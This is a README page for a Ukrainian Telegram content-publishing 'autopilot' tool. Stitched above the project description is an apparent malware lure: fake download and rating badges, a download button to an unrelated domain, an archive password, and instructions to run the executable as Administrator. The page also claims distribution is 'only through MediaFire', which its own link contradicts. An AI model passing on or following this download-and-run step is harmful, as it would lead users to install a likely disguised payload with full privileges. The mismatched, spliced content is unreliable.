<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# UA FREE Telegram Autopilot v2.0.0-rc90

Windows Portable автопілот для збору, відбору, редактури та публікації контенту в Telegram з опційним кроспостингом у Facebook.

## Архітектура

- `telegram_autopilot/v2` — активний runtime, канали, черга, editorial pipeline, Supervisor та updater.
- `Data` — тільки користувацькі дані: база, конфігурація, журнали, кеш і службовий стан.
- `Tools` — відтворювані важкі інструменти: LanguageTool, JRE і Codex. Вони не входять у Data і не мігруються зі старих версій.
- Anti-Slop, мовні/граматичні блокери, paragraph/corruption QA та фактова перевірка працюють у фінальному V2 editorial pipeline.
- AI Router використовує зовнішні провайдери та local fallback; Codex через ChatGPT є резервним trusted provider, а не першим маршрутом для кожної дрібної задачі.

## Перший запуск / міграція

Нова чиста папка не потребує копіювання старої `Data`. На першому запуску можна вказати стару папку Autopilot або її `Data`; імпортер у режимі read-only переносить лише довготривалі дані: канали, правила, джерела, історію матеріалів/публікацій, feedback та зашифровані credentials. Логи, cache, Tools, provider cooldowns і runtime queues не переносяться.

## Portable layout

```text
UA_FREE_Telegram_Autopilot.exe
_runtime/
Tools/
Data/
VERSION.txt
PUBLIC_VERSION.txt
V2_VERSION.txt
README.txt
```

При штатному оновленні `Data` і `Tools` зберігаються. При закритті V2 runtime явно завершує власний LanguageTool JVM, щоб стара папка не залишалася заблокованою `java.exe`.

Поточний реліз: **v2.0.0-rc90**.
